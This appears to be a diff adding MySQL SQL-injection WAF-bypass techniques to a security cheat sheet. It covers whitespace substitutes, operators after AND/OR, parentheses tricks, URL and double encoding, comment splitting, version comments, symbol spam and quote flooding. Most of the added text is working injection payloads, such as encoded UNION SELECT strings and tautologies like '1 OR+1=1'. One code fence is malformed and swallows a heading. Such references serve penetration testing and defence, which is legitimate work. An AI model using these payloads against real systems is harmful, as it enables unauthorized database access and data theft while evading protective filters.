@@ -32,7 +32,73 @@ SELECT /*! nested comment */ username FROM users
 
 ### Whitespace Manipulation
 
-MySQL is generally flexible with whitespace, allowing creative formatting:
+MySQL is generally flexible with whitespace, allowing creative formatting.
+
+#### Allowed Intermediary Characters (Whitespace Alternatives)
+
+These characters can substitute for spaces in MySQL queries:
+
+| Hex  | Dec | Character          | URL Encoded |
+| ---- | --- | ------------------ | ----------- |
+| 0x09 | 9   | Horizontal Tab     | %09         |
+| 0x0A | 10  | New Line (LF)      | %0A         |
+| 0x0B | 11  | Vertical Tab       | %0B         |
+| 0x0C | 12  | Form Feed/New Page | %0C         |
+| 0x0D | 13  | Carriage Return    | %0D         |
+| 0x20 | 32  | Space              | %20         |
+| 0xA0 | 160 | Non-breaking Space | %A0         |
+
+**Example payload:**
+
+```text
+'%0A%09UNION%0CSELECT%A0NULL%20%23
+```
+
+#### Characters Allowed After AND/OR
+
+These characters can immediately follow `AND` or `OR` without spaces:
+
+| Hex  | Character | Description |
+| ---- | --------- | ----------- |
+| 0x20 | (space)   | Space       |
+| 0x2B | +         | Plus        |
+| 0x2D | -         | Minus       |
+| 0x7E | ~         | Tilde       |
+| 0x21 | !         | Exclamation |
+| 0x40 | @         | At sign     |
+
+**Example payloads:**
+
+```sql
+-- Using + after OR
+1 OR+1=1
+
+-- Using - after AND
+1 AND-1=-1
+
+-- Using ~ after OR
+1 OR~1
+
+-- Using ! after AND
+1 AND!0
+```
+
+#### Parentheses as Whitespace Alternatives
+
+Parentheses can replace spaces around keywords and function calls:
+
+```sql
+-- No spaces needed with parentheses
+UNION(SELECT(column)FROM(table))
+
+-- Complex example
+SELECT(username)FROM(users)WHERE(id=1)
+
+-- Nested parentheses
+(SELECT(username)FROM(users))
+```
+
+#### Whitespace Examples
 
 ```sql
 -- Using tabs, newlines, and carriage returns
@@ -139,6 +205,85 @@ UNION attacks can be obfuscated:
 
 -- Nested UNIONs
 1 UNION (SELECT * FROM (SELECT 1,2,3)x)
+```
+
+### Encoding Bypasses
+
+#### URL Encoding
+
+```text
+-- Standard URL encoding
+%74able_%6eame → table_name
+
+-- Double URL encoding (decoded twice by server)
+%2574able_%256eame → table_name
+
+-- Unicode encoding
+%u0074able_%u006eame → table_name
+
+-- Invalid hex encoding (ASP/IIS specific)
+%tab%le_%na%me → table_name
+```
+
+#### Comment Obfuscation with Newlines
+
+Using newlines within comment sequences to bypass pattern matching:
+
+```sql
+1'#
+AND 0--
+UNION SELECT 1,2,3
+```
+
+This breaks up the payload across multiple lines, evading single-line pattern matching.
+
+### Keyword Bypass Techniques
+
+#### Spaces in Identifiers
+
+MySQL allows spaces around dots in qualified names:
+
+```sql
+-- Add spaces around the dot
+information_schema . tables
+information_schema . columns
+```
+
+#### Backtick Escaping
+
+Use backticks to quote identifiers:
+
+```sql
+-- Backtick-quoted identifiers
+`information_schema`.`tables`
+`information_schema`.`columns`
+```
+
+#### Version-Specific Execution
+
+Wrap keywords in version-specific comments:
+
+````sql
+-- Only executes on MySQL 5+
+/*!information_schema.tables*/
+/*!50000 SELECT */ * FROM users
+
+#### Symbol Spam
+Using valid arithmetic operators to confuse WAFs:
+
+```sql
+-- Valid SQL using multiple operators
+1 AND -+--+--+~0
+1 AND -+--+--+~~((1))
+````
+
+#### Quote Flooding
+
+Using excessive quotes to bypass WAFs that count quotes:
+
+```sql
+-- Using multiple quotes
+SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
 ```
 
 ### Advanced MySQL-specific Bypasses
